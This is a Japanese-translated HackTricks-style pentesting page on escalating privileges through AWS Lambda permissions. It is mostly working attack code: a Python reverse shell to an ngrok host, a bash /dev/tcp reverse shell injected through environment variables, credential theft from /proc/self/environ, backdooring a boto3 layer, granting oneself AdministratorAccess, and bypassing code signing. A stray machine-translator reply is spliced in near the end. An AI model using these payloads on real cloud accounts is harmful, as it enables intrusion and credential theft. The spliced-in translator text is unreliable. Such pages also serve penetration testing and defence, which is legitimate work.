# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction`** の権限を持つユーザーは権限を昇格できます。\
彼らは**新しい Lambda 関数を作成して既存の IAM ロールを割り当てる**ことができ、そのロールに紐づく権限が関数に付与されます。ユーザーはその後**この Lambda 関数にコードを書き込みアップロードする（例えば rev shell）**ことができます。\
関数がセットアップされると、ユーザーは **実行をトリガー** して AWS API を通じて Lambda 関数を呼び出すことで意図した処理を実行できます。この方法により、ユーザーは関連する IAM ロールに付与されたアクセスレベルで間接的に操作を行えます。\\

攻撃者はこれを悪用して **rev shell と token を盗む** ことができます:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
また、lambda 関数自体から **lambda ロールの権限を悪用する** こともできます。\
lambda ロールに十分な権限があれば、それを使って自分に管理者権限を付与できます:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
外部接続を必要とせずに lambda の role credentials を leak することも可能です。これは内部タスクで使用される **Network isolated Lambdas** に有用です。未知の security groups があなたの reverse shells をフィルタしている場合、このコードは lambda の出力として credentials を直接 leak することを可能にします。
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**潜在的な影響:** 指定された任意の lambda サービスロールに対する直接的な privesc。

> [!CAUTION]
> 興味深く見えるかもしれませんが、**`lambda:InvokeAsync`** 単体では **`aws lambda invoke-async` を実行** することは**できません**。**`lambda:InvokeFunction`** も必要です。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

前のシナリオと同様に、**自分に `lambda:InvokeFunction` を付与する** ことができます（**`lambda:AddPermission`** の権限がある場合）。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** 指定された任意の Lambda service role への直接 privesc。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

`iam:PassRole`、`lambda:CreateFunction`、`lambda:CreateEventSourceMapping` の権限（場合によっては `dynamodb:PutItem` や `dynamodb:CreateTable` も）があるユーザーは、`lambda:InvokeFunction` がなくても間接的に **escalate privileges** できます。\
彼らは悪意あるコードを含む **Lambda function を作成し、既存の IAM role を割り当てる** ことができます。

Lambda を直接呼び出す代わりに、ユーザーは既存の DynamoDB テーブルを作成または利用し、それを event source mapping を通じて Lambda にリンクします。この構成により、テーブルに新しいアイテムが追加されると（ユーザーの操作または別のプロセスによって）、Lambda function が **テーブルへの新しいアイテム登録時に自動でトリガーされる** ようになり、結果として Lambda function が間接的に呼び出され、渡された IAM role の権限でコードが実行されます。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
もしDynamoDBが既にAWS環境で有効になっている場合、ユーザーはLambda関数のために**イベントソースマッピングを設定するだけでよい**。しかし、DynamoDBが利用されていない場合は、ストリーミングを有効にした**新しいテーブルを作成する必要があります**：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
これで、**Lambda function を DynamoDB table に接続する** には、**event source mapping を作成する** ことで可能です:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda functionがDynamoDB streamにリンクされている場合、攻撃者はDynamoDB streamを作動させることで**間接的にLambdaをトリガーすることができます**。これはDynamoDBテーブルに**アイテムを挿入する**ことで実行できます:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** 指定された lambda サービスロールへの直接的な privesc。

### `lambda:AddPermission`

この権限を持つ攻撃者は **自分自身（または他者）に任意の権限を付与できる**（これはリソースへのアクセスを付与するためのリソースベースポリシーを生成する）：
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**潜在的な影響:** コードの変更と実行を許可する権限を付与することで、lambda のサービスロールに対する直接的な privesc を行える。

### `lambda:AddLayerVersionPermission`

この権限を持つ攻撃者は、**自分（または他者）に `lambda:GetLayerVersion` 権限を付与できる**。レイヤーにアクセスして脆弱性や機密情報を探すことが可能だ。
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** 機密情報への潜在的なアクセス。

### `lambda:UpdateFunctionCode`

ユーザーが **`lambda:UpdateFunctionCode`** 権限を持っていると、IAM ロールに紐づいた既存の Lambda 関数のコードを**変更できる可能性があります。**\
攻撃者は **Lambda のコードを変更して IAM 資格情報を窃取（exfiltrate）するように仕組むことができます。**

攻撃者が関数を直接呼び出す権限を持っていない場合でも、Lambda 関数が既に存在して稼働しているなら、既存のワークフローやイベントによってトリガーされる可能性が高く、その結果変更したコードが間接的に実行されることがあります。
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** 使用されている lambda service role への直接 privesc

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

この権限があれば、環境変数を追加して Lambda が任意のコードを実行するようにできます。例えば python では環境変数 `PYTHONWARNING` と `BROWSER` を悪用して python プロセスに任意のコマンドを実行させることが可能です:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
他のスクリプト言語では、使用できる別の環境変数があります。詳細は、次のスクリプト言語の小節を参照してください：

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) を使うと、lamdba 関数に **code** を含めることができますが、**別に格納する** ことで関数の **code** を小さく保て、**複数の関数でcodeを共有できる** ようになります。

lambda 内では、次のような関数で python code が読み込まれるパスを確認できます：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
これらが対象のパスです:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Exploitation

権限 `lambda:UpdateFunctionConfiguration` を悪用して、lambda 関数に **新しい layer を追加** することが可能です。任意のコードを実行するためには、この layer に lambda が import するような **ライブラリ** を含める必要があります。lambda のコードを読めるなら容易に見つけられます。また、lambda が **すでに layer を使用している** 可能性があり、その layer を **ダウンロード** してそこに **コードを追加** できることもあります。

例えば、lambda がライブラリ boto3 を使用していると仮定すると、これはそのライブラリの最新バージョンを含むローカル layer を作成します:
```bash
pip3 install -t ./lambda_layer boto3
```
`./lambda_layer/boto3/__init__.py` を開き、**グローバルコードに backdoor を追加**できます（例: credentials を exfiltrate する関数や reverse shell を得る関数）。

その後、`./lambda_layer` ディレクトリを zip にし、**新しい lambda layer を upload**して自分のアカウント（または被害者のアカウント、ただし権限がない可能性があります）に配置します。\
注意: /opt/python/boto3 を override するために python フォルダを作成してライブラリをそこに置く必要があります。 また、layer は lambda が使用する **compatible with the python version** である必要があり、もし自分のアカウントに upload する場合は **same region:** に配置する必要があります:
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
次に、アップロードした lambda layer を**任意のアカウントからでもアクセス可能に**します:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
そして、lambda layer を victim lambda function にアタッチする:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
次のステップは、可能であれば自分で **invoke the function** するか、通常の手段で **it gets invoked** されるのを待つことになります — 後者の方が安全な方法です。

A **more stealth way to exploit this vulnerability** can be found in:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** 直接的な privesc が使用されている lambda service role に対して行われます。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

おそらくこれらの権限があれば function を作成し、URL を呼び出して実行できるかもしれません…しかし私の方ではテスト方法を見つけられなかったので、見つけたら教えてください！

### Lambda MitM

一部の lambdas はパラメータでユーザから機密情報を **receiving sensitive info from the users in parameters.** もしそのうちの1つで RCE を得られれば、他のユーザがそこに送っている情報を exfiltrate できます。詳しくは次を確認してください:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## 参考

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
パス A) CSC を削除してからコードを更新：
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
パス B) Warn にダウングレードしてコードを更新する (delete が許可されていない場合):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
確認しました。以下のルールで翻訳を行います。

- コード、ハッキング技術名、一般的なハッキング用語、クラウド/SaaSプラットフォーム名（例: Workspace、aws、gcp 等）、単語 "leak"、pentesting、リンク、Markdown/HTML タグ、ファイルパスは翻訳しません。  
- {#ref} や {#include} 等のタグやリンク、パスはそのまま残します。  
- 翻訳に余分な内容は追加しません。

続けて翻訳するファイルの内容を送ってください。
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
潜在的な影響: サイン済みデプロイを強制するはずの関数に対して、任意の署名されていないコードをプッシュおよび実行できる可能性があり、結果として関数ロールの権限でコードが実行される可能性があります。

クリーンアップ:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

